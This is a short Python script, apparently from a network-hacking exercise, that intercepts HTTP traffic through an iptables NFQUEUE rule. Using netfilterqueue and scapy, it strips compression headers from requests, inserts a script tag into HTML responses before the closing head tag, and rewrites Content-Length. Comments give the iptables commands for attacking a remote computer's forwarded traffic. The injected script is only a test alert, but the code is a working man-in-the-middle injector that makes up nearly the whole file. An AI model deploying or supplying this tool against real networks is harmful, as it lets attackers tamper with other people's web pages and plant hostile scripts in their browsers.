# Targeting a remote computer
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

# Testing on the local computer
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables --flush


import netfilterqueue
import scapy.all as sc
import re


def set_load(packet, load):
    packet[sc.Raw].load = load
    del packet[sc.IP].len
    del packet[sc.IP].chksum
    del packet[sc.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = sc.IP(packet.get_payload())
    if scapy_packet.haslayer(sc.Raw):
        try:
            load = scapy_packet[sc.Raw].load.decode()
            if scapy_packet[sc.TCP].dport == 80:
                # print(f'[+] Request > {load}')
                load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
            elif scapy_packet[sc.TCP].sport == 80:
                # print(f'[+] Response > {load}')
                injection_code = '<script>alert("test");</script>'
                load = load.replace(
                    # '</body>', injection_code + '</body>')
                    '</head>', injection_code + '</head>')
                content_length_search = re.search(
                    '(?:Content-Length:\s)(\d*)', load)
                if content_length_search and 'text/html' in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(
                        content_length) + len(injection_code)
                    load = load.replace(
                        content_length, str(new_content_length))

            if load != scapy_packet[sc.Raw].load:
                # print(f'[+] Modified load > {load}')
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
